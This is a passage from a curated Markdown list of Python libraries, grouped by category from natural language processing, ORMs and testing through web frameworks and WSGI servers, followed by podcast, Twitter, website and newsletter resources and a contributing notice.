system.\n* [boltons](https:\/\/github.com\/mahmoud\/boltons) - A set of pure-Python utilities.\n* [itsdangerous](https:\/\/github.com\/pallets\/itsdangerous) - Various helpers to pass trusted data to untrusted environments.\n* [pluginbase](https:\/\/github.com\/mitsuhiko\/pluginbase) - A simple but flexible plugin system for Python.\n* [tryton](http:\/\/www.tryton.org\/) - A general purpose business framework.\n\n## Natural Language Processing\n\n*Libraries for working with human languages.*\n\n- General\n    * [gensim](https:\/\/github.com\/RaRe-Technologies\/gensim) - Topic Modeling for Humans.\n    * [langid.py](https:\/\/github.com\/saffsd\/langid.py) - Stand-alone language identification system.\n    * [nltk](http:\/\/www.nltk.org\/) - A leading platform for building Python programs to work with human language data.\n    * [pattern](https:\/\/github.com\/clips\/pattern) - A web mining module for the Python.\n    * [polyglot](https:\/\/github.com\/aboSamoor\/polyglot) - Natural language pipeline supporting hundreds of languages.\n    * [pytext](https:\/\/github.com\/facebookresearch\/pytext) - A natural language modeling framework based on PyTorch.\n    * [PyTorch-NLP](https:\/\/github.com\/PetrochukM\/PyTorch-NLP) - A toolkit enabling rapid deep learning NLP prototyping for research.\n    * [spacy](https:\/\/spacy.io\/) - A library for industrial-strength natural language processing in Python and Cython.\n    * [stanfordnlp](https:\/\/github.com\/stanfordnlp\/stanfordnlp) - The Stanford NLP Group's official Python library, supporting 50+ languages.\n- Chinese\n    * [jieba](https:\/\/github.com\/fxsjy\/jieba) - The most popular Chinese text segmentation library.\n    * [pkuseg-python](https:\/\/github.com\/lancopku\/pkuseg-python) - A toolkit for Chinese word segmentation in various domains.\n    * [snownlp](https:\/\/github.com\/isnowfy\/snownlp) - A library for processing Chinese text.\n    * [funNLP](https:\/\/github.com\/fighting41love\/funNLP) - A collection of tools and datasets for Chinese NLP.\n\n## Network Virtualization\n\n*Tools and libraries for Virtual Networking and SDN (Software Defined Networking).*\n\n* [mininet](https:\/\/github.com\/mininet\/mininet) - A popular network emulator and API written in Python.\n* [napalm](https:\/\/github.com\/napalm-automation\/napalm) - Cross-vendor API to manipulate network devices.\n* [pox](https:\/\/github.com\/noxrepo\/pox) - A Python-based SDN control applications, such as OpenFlow SDN controllers.\n\n## News Feed\n\n*Libraries for building user's activities.*\n\n* [django-activity-stream](https:\/\/github.com\/justquick\/django-activity-stream) - Generating generic activity streams from the actions on your site.\n* [Stream Framework](https:\/\/github.com\/tschellenbach\/Stream-Framework) - Building news feed and notification systems using Cassandra and Redis.\n\n## ORM\n\n*Libraries that implement Object-Relational Mapping or data mapping techniques.*\n\n* Relational Databases\n    * [Django Models](https:\/\/docs.djangoproject.com\/en\/dev\/topics\/db\/models\/) - The Django ORM.\n    * [SQLAlchemy](https:\/\/www.sqlalchemy.org\/) - The Python SQL Toolkit and Object Relational Mapper.\n        * [awesome-sqlalchemy](https:\/\/github.com\/dahlia\/awesome-sqlalchemy)\n    * [dataset](https:\/\/github.com\/pudo\/dataset) - Store Python dicts in a database - works with SQLite, MySQL, and PostgreSQL.\n    * [orator](https:\/\/github.com\/sdispater\/orator) -  The Orator ORM provides a simple yet beautiful ActiveRecord implementation.\n    * [orm](https:\/\/github.com\/encode\/orm) - An async ORM.\n    * [peewee](https:\/\/github.com\/coleifer\/peewee) - A small, expressive ORM.\n    * [pony](https:\/\/github.com\/ponyorm\/pony\/) - ORM that provides a generator-oriented interface to SQL.\n    * [pydal](https:\/\/github.com\/web2py\/pydal\/) - A pure Python Database Abstraction Layer.\n* NoSQL Databases\n    * [hot-redis](https:\/\/github.com\/stephenmcd\/hot-redis) - Rich Python data types for Redis.\n    * [mongoengine](https:\/\/github.com\/MongoEngine\/mongoengine) - A Python Object-Document-Mapper for working with MongoDB.\n    * [PynamoDB](https:\/\/github.com\/pynamodb\/PynamoDB) - A Pythonic interface for [Amazon DynamoDB](https:\/\/aws.amazon.com\/dynamodb\/).\n    * [redisco](https:\/\/github.com\/kiddouk\/redisco) - A Python Library for Simple Models and Containers Persisted in Redis.\n\n## Package Management\n\n*Libraries for package and dependency management.*\n\n* [pip](https:\/\/pip.pypa.io\/en\/stable\/) - The Python package and dependency manager.\n    * [PyPI](https:\/\/pypi.org\/)\n    * [pip-tools](https:\/\/github.com\/jazzband\/pip-tools) - A set of tools to keep your pinned Python dependencies fresh.\n* [conda](https:\/\/github.com\/conda\/conda\/) - Cross-platform, Python-agnostic binary package manager.\n\n## Package Repositories\n\n*Local PyPI repository server and proxies.*\n\n* [warehouse](https:\/\/github.com\/pypa\/warehouse) - Next generation Python Package Repository (PyPI).\n* [bandersnatch](https:\/\/github.com\/pypa\/bandersnatch\/) - PyPI mirroring tool provided by Python Packaging Authority (PyPA).\n* [devpi](https:\/\/github.com\/devpi\/devpi) - PyPI server and packaging\/testing\/release tool.\n* [localshop](https:\/\/github.com\/jazzband\/localshop) - Local PyPI server (custom packages and auto-mirroring of pypi).\n\n## Permissions\n\n*Libraries that allow or deny users access to data or functionality.*\n\n* [django-guardian](https:\/\/github.com\/django-guardian\/django-guardian) - Implementation of per object permissions for Django 1.2+\n* [django-rules](https:\/\/github.com\/dfunckt\/django-rules) - A tiny but powerful app providing object-level permissions to Django, without requiring a database.\n\n## Processes\n\n*Libraries for starting and communicating with OS processes.*\n\n* [delegator.py](https:\/\/github.com\/amitt001\/delegator.py) - [Subprocesses](https:\/\/docs.python.org\/3\/library\/subprocess.html) for Humans 2.0.\n* [sarge](https:\/\/sarge.readthedocs.io\/en\/latest\/) - Yet another wrapper for subprocess.\n* [sh](https:\/\/github.com\/amoffat\/sh) - A full-fledged subprocess replacement for Python.\n\n## Recommender Systems\n\n*Libraries for building recommender systems.*\n\n* [annoy](https:\/\/github.com\/spotify\/annoy) - Approximate Nearest Neighbors in C++\/Python optimized for memory usage.\n* [fastFM](https:\/\/github.com\/ibayer\/fastFM) - A library for Factorization Machines.\n* [implicit](https:\/\/github.com\/benfred\/implicit) - A fast Python implementation of collaborative filtering for implicit datasets.\n* [libffm](https:\/\/github.com\/guestwalk\/libffm) - A library for Field-aware Factorization Machine (FFM).\n* [lightfm](https:\/\/github.com\/lyst\/lightfm) - A Python implementation of a number of popular recommendation algorithms.\n* [spotlight](https:\/\/github.com\/maciejkula\/spotlight) - Deep recommender models using PyTorch.\n* [Surprise](https:\/\/github.com\/NicolasHug\/Surprise) - A scikit for building and analyzing recommender systems.\n* [tensorrec](https:\/\/github.com\/jfkirk\/tensorrec) - A Recommendation Engine Framework in TensorFlow.\n\n## RESTful API\n\n*Libraries for building RESTful APIs.*\n\n* Django\n    * [django-rest-framework](http:\/\/www.django-rest-framework.org\/) - A powerful and flexible toolkit to build web APIs.\n    * [django-tastypie](http:\/\/tastypieapi.org\/) - Creating delicious APIs for Django apps.\n* Flask\n    * [eve](https:\/\/github.com\/pyeve\/eve) - REST API framework powered by Flask, MongoDB and good intentions.\n    * [flask-api](https:\/\/github.com\/flask-api\/flask-api) - Browsable Web APIs for Flask.\n    * [flask-restful](https:\/\/github.com\/flask-restful\/flask-restful) - Quickly building REST APIs for Flask.\n* Pyramid\n    * [cornice](https:\/\/github.com\/Cornices\/cornice) - A RESTful framework for Pyramid.\n* Framework agnostic\n    * [apistar](https:\/\/github.com\/encode\/apistar) - A smart Web API framework, designed for Python 3.\n    * [falcon](https:\/\/github.com\/falconry\/falcon) - A high-performance framework for building cloud APIs and web app backends.\n    * [fastapi](https:\/\/github.com\/tiangolo\/fastapi) - A modern, fast, web framework for building APIs with Python 3.6+ based on standard Python type hints.\n    * [hug](https:\/\/github.com\/hugapi\/hug) - A Python 3 framework for cleanly exposing APIs.\n    * [sandman2](https:\/\/github.com\/jeffknupp\/sandman2) - Automated REST APIs for existing database-driven systems.\n    * [sanic](https:\/\/github.com\/huge-success\/sanic) - A Python 3.6+ web server and web framework that's written to go fast.\n    * [vibora](https:\/\/vibora.io\/) - Fast, efficient and asynchronous Web framework inspired by Flask.\n\n## Robotics\n\n*Libraries for robotics.*\n\n* [PythonRobotics](https:\/\/github.com\/AtsushiSakai\/PythonRobotics) - This is a compilation of various robotics algorithms with visualizations.\n* [rospy](http:\/\/wiki.ros.org\/rospy) - This is a library for ROS (Robot Operating System).\n\n## RPC Servers\n\n*RPC-compatible servers.*\n\n* [zeroRPC](https:\/\/github.com\/0rpc\/zerorpc-python) - zerorpc is a flexible RPC implementation based on [ZeroMQ](http:\/\/zeromq.org\/) and [MessagePack](http:\/\/msgpack.org\/).\n\n## Science\n\n*Libraries for scientific computing. Also see [Python-for-Scientists](https:\/\/github.com\/TomNicholas\/Python-for-Scientists)*\n\n* [astropy](http:\/\/www.astropy.org\/) - A community Python library for Astronomy.\n* [bcbio-nextgen](https:\/\/github.com\/chapmanb\/bcbio-nextgen) - Providing best-practice pipelines for fully automated high throughput sequencing analysis.\n* [bccb](https:\/\/github.com\/chapmanb\/bcbb) - Collection of useful code related to biological analysis.\n* [Biopython](http:\/\/biopython.org\/wiki\/Main_Page) - Biopython is a set of freely available tools for biological computation.\n* [cclib](http:\/\/cclib.github.io\/) - A library for parsing and interpreting the results of computational chemistry packages.\n* [Colour](http:\/\/colour-science.org\/) - Implementing a comprehensive number of colour theory transformations and algorithms.\n* [NetworkX](https:\/\/networkx.github.io\/) - A high-productivity software for complex networks.\n* [NIPY](http:\/\/nipy.org) - A collection of neuroimaging toolkits.\n* [NumPy](http:\/\/www.numpy.org\/) - A fundamental package for scientific computing with Python.\n* [Open Babel](http:\/\/openbabel.org\/wiki\/Main_Page) - A chemical toolbox designed to speak the many languages of chemical data.\n* [ObsPy](https:\/\/github.com\/obspy\/obspy\/wiki\/) - A Python toolbox for seismology.\n* [PyDy](http:\/\/www.pydy.org\/) - Short for Python Dynamics, used to assist with workflow in the modeling of dynamic motion.\n* [PyMC](https:\/\/github.com\/pymc-devs\/pymc3) - Markov Chain Monte Carlo sampling toolkit.\n* [QuTiP](http:\/\/qutip.org\/) - Quantum Toolbox in Python.\n* [RDKit](http:\/\/www.rdkit.org\/) - Cheminformatics and Machine Learning Software.\n* [SciPy](https:\/\/www.scipy.org\/) - A Python-based ecosystem of open-source software for mathematics, science, and engineering.\n* [statsmodels](https:\/\/github.com\/statsmodels\/statsmodels) - Statistical modeling and econometrics in Python.\n* [SymPy](https:\/\/github.com\/sympy\/sympy) - A Python library for symbolic mathematics.\n* [Zipline](https:\/\/github.com\/quantopian\/zipline) - A Pythonic algorithmic trading library.\n* [SimPy](https:\/\/bitbucket.org\/simpy\/simpy) -  A process-based discrete-event simulation framework.\n\n## Search\n\n*Libraries and software for indexing and performing search queries on data.*\n\n* [elasticsearch-py](https:\/\/www.elastic.co\/guide\/en\/elasticsearch\/client\/python-api\/current\/index.html) - The official low-level Python client for [Elasticsearch](https:\/\/www.elastic.co\/products\/elasticsearch).\n* [elasticsearch-dsl-py](https:\/\/github.com\/elastic\/elasticsearch-dsl-py) - The official high-level Python client for Elasticsearch.\n* [django-haystack](https:\/\/github.com\/django-haystack\/django-haystack) - Modular search for Django.\n* [pysolr](https:\/\/github.com\/django-haystack\/pysolr) - A lightweight Python wrapper for [Apache Solr](https:\/\/lucene.apache.org\/solr\/).\n* [whoosh](http:\/\/whoosh.readthedocs.io\/en\/latest\/) - A fast, pure Python search engine library.\n\n## Serialization\n\n*Libraries for serializing complex data types*\n\n* [marshmallow](https:\/\/github.com\/marshmallow-code\/marshmallow) - A lightweight library for converting complex objects to and from simple Python datatypes.\n* [pysimdjson](https:\/\/github.com\/TkTech\/pysimdjson) - A Python bindings for [simdjson](https:\/\/github.com\/lemire\/simdjson).\n* [python-rapidjson](https:\/\/github.com\/python-rapidjson\/python-rapidjson) - A Python wrapper around [RapidJSON](https:\/\/github.com\/Tencent\/rapidjson).\n* [ultrajson](https:\/\/github.com\/esnme\/ultrajson) - A fast JSON decoder and encoder written in C with Python bindings.\n\n## Serverless Frameworks\n\n*Frameworks for developing serverless Python code.*\n\n* [python-lambda](https:\/\/github.com\/nficano\/python-lambda) - A toolkit for developing and deploying Python code in AWS Lambda.\n* [Zappa](https:\/\/github.com\/Miserlou\/Zappa) - A tool for deploying WSGI applications on AWS Lambda and API Gateway.\n\n## Specific Formats Processing\n\n*Libraries for parsing and manipulating specific text formats.*\n\n* General\n    * [tablib](https:\/\/github.com\/kennethreitz\/tablib) - A module for Tabular Datasets in XLS, CSV, JSON, YAML.\n* Office\n    * [openpyxl](https:\/\/openpyxl.readthedocs.io\/en\/stable\/) - A library for reading and writing Excel 2010 xlsx\/xlsm\/xltx\/xltm files.\n    * [pyexcel](https:\/\/github.com\/pyexcel\/pyexcel) - Providing one API for reading, manipulating and writing csv, ods, xls, xlsx and xlsm files.\n    * [python-docx](https:\/\/github.com\/python-openxml\/python-docx) - Reads, queries and modifies Microsoft Word 2007\/2008 docx files.\n    * [python-pptx](https:\/\/github.com\/scanny\/python-pptx) - Python library for creating and updating PowerPoint (.pptx) files.\n    * [unoconv](https:\/\/github.com\/unoconv\/unoconv) - Convert between any document format supported by LibreOffice\/OpenOffice.\n    * [XlsxWriter](https:\/\/github.com\/jmcnamara\/XlsxWriter) - A Python module for creating Excel .xlsx files.\n    * [xlwings](https:\/\/github.com\/ZoomerAnalytics\/xlwings) - A BSD-licensed library that makes it easy to call Python from Excel and vice versa.\n    * [xlwt](https:\/\/github.com\/python-excel\/xlwt) \/ [xlrd](https:\/\/github.com\/python-excel\/xlrd) - Writing and reading data and formatting information from Excel files.\n* PDF\n    * [PDFMiner](https:\/\/github.com\/euske\/pdfminer) - A tool for extracting information from PDF documents.\n    * [PyPDF2](https:\/\/github.com\/mstamy2\/PyPDF2) - A library capable of splitting, merging and transforming PDF pages.\n    * [ReportLab](https:\/\/www.reportlab.com\/opensource\/) - Allowing Rapid creation of rich PDF documents.\n* Markdown\n    * [Mistune](https:\/\/github.com\/lepture\/mistune) - Fastest and full featured pure Python parsers of Markdown.\n    * [Python-Markdown](https:\/\/github.com\/waylan\/Python-Markdown) - A Python implementation of John Gruber\u2019s Markdown.\n* YAML\n    * [PyYAML](http:\/\/pyyaml.org\/) - YAML implementations for Python.\n* CSV\n    * [csvkit](https:\/\/github.com\/wireservice\/csvkit) - Utilities for converting to and working with CSV.\n* Archive\n    * [unp](https:\/\/github.com\/mitsuhiko\/unp) - A command line tool that can unpack archives easily.\n\n## Static Site Generator\n\n*Static site generator is a software that takes some text + templates as input and produces HTML files on the output.*\n\n* [mkdocs](https:\/\/github.com\/mkdocs\/mkdocs\/) - Markdown friendly documentation generator.\n* [pelican](https:\/\/github.com\/getpelican\/pelican) - Static site generator that supports Markdown and reST syntax.\n* [lektor](https:\/\/github.com\/lektor\/lektor) - An easy to use static CMS and blog engine.\n* [nikola](https:\/\/github.com\/getnikola\/nikola) - A static website and blog generator.\n\n## Tagging\n\n*Libraries for tagging items.*\n\n* [django-taggit](https:\/\/github.com\/jazzband\/django-taggit) - Simple tagging for Django.\n\n## Task Queues\n\n*Libraries for working with task queues.*\n\n* [celery](http:\/\/www.celeryproject.org\/) - An asynchronous task queue\/job queue based on distributed message passing.\n* [huey](https:\/\/github.com\/coleifer\/huey) - Little multi-threaded task queue.\n* [mrq](https:\/\/github.com\/pricingassistant\/mrq) - A distributed worker task queue in Python using Redis & gevent.\n* [rq](https:\/\/github.com\/rq\/rq) - Simple job queues for Python.\n\n## Template Engine\n\n*Libraries and tools for templating and lexing.*\n\n* [Jinja2](https:\/\/github.com\/pallets\/jinja) - A modern and designer friendly templating language.\n* [Genshi](https:\/\/genshi.edgewall.org\/) - Python templating toolkit for generation of web-aware output.\n* [Mako](http:\/\/www.makotemplates.org\/) - Hyperfast and lightweight templating for the Python platform.\n\n## Testing\n\n*Libraries for testing codebases and generating test data.*\n\n* Testing Frameworks\n    * [pytest](https:\/\/docs.pytest.org\/en\/latest\/) - A mature full-featured Python testing tool.\n    * [hypothesis](https:\/\/github.com\/HypothesisWorks\/hypothesis) - Hypothesis is an advanced Quickcheck style property based testing library.\n    * [nose2](https:\/\/github.com\/nose-devs\/nose2) - The successor to `nose`, based on `unittest2.\n    * [Robot Framework](https:\/\/github.com\/robotframework\/robotframework) - A generic test automation framework.\n    * [unittest](https:\/\/docs.python.org\/3\/library\/unittest.html) - (Python standard library) Unit testing framework.\n* Test Runners\n    * [green](https:\/\/github.com\/CleanCut\/green) - A clean, colorful test runner.\n    * [mamba](http:\/\/nestorsalceda.github.io\/mamba\/) - The definitive testing tool for Python. Born under the banner of BDD.\n    * [tox](https:\/\/tox.readthedocs.io\/en\/latest\/) - Auto builds and tests distributions in multiple Python versions\n* GUI \/ Web Testing\n    * [locust](https:\/\/github.com\/locustio\/locust) - Scalable user load testing tool written in Python.\n    * [PyAutoGUI](https:\/\/github.com\/asweigart\/pyautogui) - PyAutoGUI is a cross-platform GUI automation Python module for human beings.\n    * [Selenium](https:\/\/pypi.org\/project\/selenium\/) - Python bindings for [Selenium](http:\/\/www.seleniumhq.org\/) WebDriver.\n    * [sixpack](https:\/\/github.com\/seatgeek\/sixpack) - A language-agnostic A\/B Testing framework.\n    * [splinter](https:\/\/github.com\/cobrateam\/splinter) - Open source tool for testing web applications.\n* Mock\n    * [mock](https:\/\/docs.python.org\/3\/library\/unittest.mock.html) - (Python standard library) A mocking and patching library.\n    * [doublex](https:\/\/pypi.org\/project\/doublex\/) - Powerful test doubles framework for Python.\n    * [freezegun](https:\/\/github.com\/spulec\/freezegun) - Travel through time by mocking the datetime module.\n    * [httmock](https:\/\/github.com\/patrys\/httmock) - A mocking library for requests for Python 2.6+ and 3.2+.\n    * [httpretty](https:\/\/github.com\/gabrielfalcao\/HTTPretty) - HTTP request mock tool for Python.\n    * [mocket](https:\/\/github.com\/mindflayer\/python-mocket) - A socket mock framework with gevent\/asyncio\/SSL support.\n    * [responses](https:\/\/github.com\/getsentry\/responses) - A utility library for mocking out the requests Python library.\n    * [VCR.py](https:\/\/github.com\/kevin1024\/vcrpy) - Record and replay HTTP interactions on your tests.\n* Object Factories\n    * [factory_boy](https:\/\/github.com\/FactoryBoy\/factory_boy) - A test fixtures replacement for Python.\n    * [mixer](https:\/\/github.com\/klen\/mixer) - Another fixtures replacement. Supported Django, Flask, SQLAlchemy, Peewee and etc.\n    * [model_mommy](https:\/\/github.com\/vandersonmota\/model_mommy) - Creating random fixtures for testing in Django.\n* Code Coverage\n    * [coverage](https:\/\/pypi.org\/project\/coverage\/) - Code coverage measurement.\n* Fake Data\n    * [mimesis](https:\/\/github.com\/lk-geimfari\/mimesis) - is a Python library that help you generate fake data.\n    * [fake2db](https:\/\/github.com\/emirozer\/fake2db) - Fake database generator.\n    * [faker](https:\/\/github.com\/joke2k\/faker) - A Python package that generates fake data.\n    * [radar](https:\/\/pypi.org\/project\/radar\/) - Generate random datetime \/ time.\n\n## Text Processing\n\n*Libraries for parsing and manipulating plain texts.*\n\n* General\n    * [chardet](https:\/\/github.com\/chardet\/chardet) - Python 2\/3 compatible character encoding detector.\n    * [difflib](https:\/\/docs.python.org\/3\/library\/difflib.html) - (Python standard library) Helpers for computing deltas.\n    * [ftfy](https:\/\/github.com\/LuminosoInsight\/python-ftfy) - Makes Unicode text less broken and more consistent automagically.\n    * [fuzzywuzzy](https:\/\/github.com\/seatgeek\/fuzzywuzzy) - Fuzzy String Matching.\n    * [Levenshtein](https:\/\/github.com\/ztane\/python-Levenshtein\/) - Fast computation of Levenshtein distance and string similarity.\n    * [pangu.py](https:\/\/github.com\/vinta\/pangu.py) - Paranoid text spacing.\n    * [pyfiglet](https:\/\/github.com\/pwaller\/pyfiglet) - An implementation of figlet written in Python.\n    * [pypinyin](https:\/\/github.com\/mozillazg\/python-pinyin) - Convert Chinese hanzi (\u6f22\u5b57) to pinyin (\u62fc\u97f3).\n    * [textdistance](https:\/\/github.com\/orsinium\/textdistance) - Compute distance between sequences with 30+ algorithms.\n    * [unidecode](https:\/\/pypi.org\/project\/Unidecode\/) - ASCII transliterations of Unicode text.\n* Slugify\n    * [awesome-slugify](https:\/\/github.com\/dimka665\/awesome-slugify) - A Python slugify library that can preserve unicode.\n    * [python-slugify](https:\/\/github.com\/un33k\/python-slugify) - A Python slugify library that translates unicode to ASCII.\n    * [unicode-slugify](https:\/\/github.com\/mozilla\/unicode-slugify) - A slugifier that generates unicode slugs with Django as a dependency.\n* Unique identifiers\n    * [hashids](https:\/\/github.com\/davidaurelio\/hashids-python) - Implementation of [hashids](http:\/\/hashids.org) in Python.\n    * [shortuuid](https:\/\/github.com\/skorokithakis\/shortuuid) - A generator library for concise, unambiguous and URL-safe UUIDs.\n* Parser\n    * [ply](https:\/\/github.com\/dabeaz\/ply) - Implementation of lex and yacc parsing tools for Python.\n    * [pygments](http:\/\/pygments.org\/) - A generic syntax highlighter.\n    * [pyparsing](https:\/\/github.com\/pyparsing\/pyparsing) - A general purpose framework for generating parsers.\n    * [python-nameparser](https:\/\/github.com\/derek73\/python-nameparser) - Parsing human names into their individual components.\n    * [python-phonenumbers](https:\/\/github.com\/daviddrysdale\/python-phonenumbers) - Parsing, formatting, storing and validating international phone numbers.\n    * [python-user-agents](https:\/\/github.com\/selwin\/python-user-agents) - Browser user agent parser.\n    * [sqlparse](https:\/\/github.com\/andialbrecht\/sqlparse) - A non-validating SQL parser.\n\n## Third-party APIs\n\n*Libraries for accessing third party services APIs. Also see [List of Python API Wrappers and Libraries](https:\/\/github.com\/realpython\/list-of-python-api-wrappers).*\n\n* [apache-libcloud](https:\/\/libcloud.apache.org\/) - One Python library for all clouds.\n* [boto3](https:\/\/github.com\/boto\/boto3) - Python interface to Amazon Web Services.\n* [django-wordpress](https:\/\/github.com\/istrategylabs\/django-wordpress) - WordPress models and views for Django.\n* [facebook-sdk](https:\/\/github.com\/mobolic\/facebook-sdk) - Facebook Platform Python SDK.\n* [google-api-python-client](https:\/\/github.com\/google\/google-api-python-client) - Google APIs Client Library for Python.\n* [gspread](https:\/\/github.com\/burnash\/gspread) - Google Spreadsheets Python API.\n* [twython](https:\/\/github.com\/ryanmcgrath\/twython) - A Python wrapper for the Twitter API.\n\n## URL Manipulation\n\n*Libraries for parsing URLs.*\n\n* [furl](https:\/\/github.com\/gruns\/furl) - A small Python library that makes parsing and manipulating URLs easy.\n* [purl](https:\/\/github.com\/codeinthehole\/purl) - A simple, immutable URL class with a clean API for interrogation and manipulation.\n* [pyshorteners](https:\/\/github.com\/ellisonleao\/pyshorteners) - A pure Python URL shortening lib.\n* [webargs](https:\/\/github.com\/marshmallow-code\/webargs) - A friendly library for parsing HTTP request arguments with built-in support for popular web frameworks.\n\n## Video\n\n*Libraries for manipulating video and GIFs.*\n\n* [moviepy](https:\/\/zulko.github.io\/moviepy\/) - A module for script-based movie editing with many formats, including animated GIFs.\n* [scikit-video](https:\/\/github.com\/aizvorski\/scikit-video) - Video processing routines for SciPy.\n\n## Web Asset Management\n\n*Tools for managing, compressing and minifying website assets.*\n\n* [django-compressor](https:\/\/github.com\/django-compressor\/django-compressor) - Compresses linked and inline JavaScript or CSS into a single cached file.\n* [django-pipeline](https:\/\/github.com\/jazzband\/django-pipeline) - An asset packaging library for Django.\n* [django-storages](https:\/\/github.com\/jschneier\/django-storages) - A collection of custom storage back ends for Django.\n* [fanstatic](http:\/\/www.fanstatic.org\/en\/latest\/) - Packages, optimizes, and serves static file dependencies as Python packages.\n* [fileconveyor](http:\/\/wimleers.com\/fileconveyor) - A daemon to detect and sync files to CDNs, S3 and FTP.\n* [flask-assets](https:\/\/github.com\/miracle2k\/flask-assets) - Helps you integrate webassets into your Flask app.\n* [webassets](https:\/\/github.com\/miracle2k\/webassets) - Bundles, optimizes, and manages unique cache-busting URLs for static resources.\n\n## Web Content Extracting\n\n*Libraries for extracting web contents.*\n\n* [html2text](https:\/\/github.com\/Alir3z4\/html2text) - Convert HTML to Markdown-formatted text.\n* [lassie](https:\/\/github.com\/michaelhelmick\/lassie) - Web Content Retrieval for Humans.\n* [micawber](https:\/\/github.com\/coleifer\/micawber) - A small library for extracting rich content from URLs.\n* [newspaper](https:\/\/github.com\/codelucas\/newspaper) - News extraction, article extraction and content curation in Python.\n* [python-readability](https:\/\/github.com\/buriy\/python-readability) - Fast Python port of arc90's readability tool.\n* [requests-html](https:\/\/github.com\/kennethreitz\/requests-html) - Pythonic HTML Parsing for Humans.\n* [sumy](https:\/\/github.com\/miso-belica\/sumy) - A module for automatic summarization of text documents and HTML pages.\n* [textract](https:\/\/github.com\/deanmalmgren\/textract) - Extract text from any document, Word, PowerPoint, PDFs, etc.\n* [toapi](https:\/\/github.com\/gaojiuli\/toapi) - Every web site provides APIs.\n\n## Web Crawling\n\n*Libraries to automate web scraping.*\n\n* [cola](https:\/\/github.com\/chineking\/cola) - A distributed crawling framework.\n* [feedparser](https:\/\/pythonhosted.org\/feedparser\/) - Universal feed parser.\n* [grab](https:\/\/github.com\/lorien\/grab) - Site scraping framework.\n* [MechanicalSoup](https:\/\/github.com\/MechanicalSoup\/MechanicalSoup) - A Python library for automating interaction with websites.\n* [pyspider](https:\/\/github.com\/binux\/pyspider) - A powerful spider system.\n* [robobrowser](https:\/\/github.com\/jmcarp\/robobrowser) - A simple, Pythonic library for browsing the web without a standalone web browser.\n* [scrapy](https:\/\/scrapy.org\/) - A fast high-level screen scraping and web crawling framework.\n* [portia](https:\/\/github.com\/scrapinghub\/portia) - Visual scraping for Scrapy.\n\n## Web Frameworks\n\n*Traditional full stack web frameworks. Also see [RESTful API](https:\/\/github.com\/vinta\/awesome-python#restful-api)*\n\n* Synchronous\n    * [Django](https:\/\/www.djangoproject.com\/) - The most popular web framework in Python.\n        * [awesome-django](https:\/\/github.com\/shahraizali\/awesome-django)\n    * [Flask](http:\/\/flask.pocoo.org\/) - A microframework for Python.\n        * [awesome-flask](https:\/\/github.com\/humiaozuzu\/awesome-flask)\n    * [Pyramid](https:\/\/pylonsproject.org\/) - A small, fast, down-to-earth, open source Python web framework.\n        * [awesome-pyramid](https:\/\/github.com\/uralbash\/awesome-pyramid)\n    * [Masonite](https:\/\/github.com\/MasoniteFramework\/masonite) - The modern and developer centric Python web framework.\n* Asynchronous\n    * [Tornado](http:\/\/www.tornadoweb.org\/en\/latest\/) - A web framework and asynchronous networking library.\n\n## WebSocket\n\n*Libraries for working with WebSocket.*\n\n* [autobahn-python](https:\/\/github.com\/crossbario\/autobahn-python) - WebSocket & WAMP for Python on Twisted and [asyncio](https:\/\/docs.python.org\/3\/library\/asyncio.html).\n* [channels](https:\/\/github.com\/django\/channels) - Developer-friendly asynchrony for Django.\n* [websockets](https:\/\/github.com\/aaugustin\/websockets) - A library for building WebSocket servers and clients with a focus on correctness and simplicity.\n\n## WSGI Servers\n\n*WSGI-compatible web servers.*\n\n* [bjoern](https:\/\/github.com\/jonashaag\/bjoern) - Asynchronous, very fast and written in C.\n* [gunicorn](https:\/\/github.com\/benoitc\/gunicorn) - Pre-forked, partly written in C.\n* [uWSGI](https:\/\/uwsgi-docs.readthedocs.io\/en\/latest\/) - A project aims at developing a full stack for building hosting services, written in C.\n* [waitress](https:\/\/github.com\/Pylons\/waitress) - Multi-threaded, powers Pyramid.\n* [werkzeug](https:\/\/github.com\/pallets\/werkzeug) - A WSGI utility library for Python that powers Flask and can easily be embedded into your own projects.\n\n# Resources\n\nWhere to discover new Python libraries.\n\n## Podcasts\n\n* [From Python Import Podcast](http:\/\/frompythonimportpodcast.com\/)\n* [Podcast.init](https:\/\/podcastinit.com\/)\n* [Python Bytes](https:\/\/pythonbytes.fm)\n* [Python Testing](http:\/\/pythontesting.net)\n* [Radio Free Python](http:\/\/radiofreepython.com\/)\n* [Talk Python To Me](https:\/\/talkpython.fm\/)\n* [Test and Code](https:\/\/testandcode.com\/)\n\n## Twitter\n\n* [@codetengu](https:\/\/twitter.com\/codetengu)\n* [@getpy](https:\/\/twitter.com\/getpy)\n* [@importpython](https:\/\/twitter.com\/importpython)\n* [@planetpython](https:\/\/twitter.com\/planetpython)\n* [@pycoders](https:\/\/twitter.com\/pycoders)\n* [@pypi](https:\/\/twitter.com\/pypi)\n* [@pythontrending](https:\/\/twitter.com\/pythontrending)\n* [@PythonWeekly](https:\/\/twitter.com\/PythonWeekly)\n* [@TalkPython](https:\/\/twitter.com\/talkpython)\n* [@realpython](https:\/\/twitter.com\/realpython)\n\n## Websites\n\n* [\/r\/CoolGithubProjects](https:\/\/www.reddit.com\/r\/coolgithubprojects\/)\n* [\/r\/Python](https:\/\/www.reddit.com\/r\/python)\n* [Awesome Python @LibHunt](https:\/\/python.libhunt.com\/)\n* [Django Packages](https:\/\/djangopackages.org\/)\n* [Full Stack Python](https:\/\/www.fullstackpython.com\/)\n* [Python Cheatsheet](https:\/\/www.pythoncheatsheet.org\/)\n* [Python ZEEF](https:\/\/python.zeef.com\/alan.richmond)\n* [Python \u5f00\u53d1\u793e\u533a](https:\/\/www.ctolib.com\/python\/)\n* [Real Python](https:\/\/realpython.com)\n* [Trending Python repositories on GitHub today](https:\/\/github.com\/trending?l=python)\n* [\u0421\u043e\u043e\u0431\u0449\u0435\u0441\u0442\u0432\u043e Python \u041f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0438\u0441\u0442\u043e\u0432](https:\/\/python-scripts.com\/)\n\n## Weekly\n\n* [CodeTengu Weekly \u78bc\u5929\u72d7\u9031\u520a](https:\/\/weekly.codetengu.com\/)\n* [Import Python Newsletter](http:\/\/importpython.com\/newsletter\/)\n* [Pycoder's Weekly](http:\/\/pycoders.com\/)\n* [Python Weekly](http:\/\/www.pythonweekly.com\/)\n* [Python Tricks](https:\/\/realpython.com\/python-tricks\/)\n\n# Contributing\n\nYour contributions are always welcome! Please take a look at the [contribution guidelines](https:\/\/github.com\/vinta\/awesome-python\/blob\/master\/CONTRIBUTING.md) first.\n\nI will keep some pull requests open if I'm not sure whether those libraries are awesome, you could [vote for 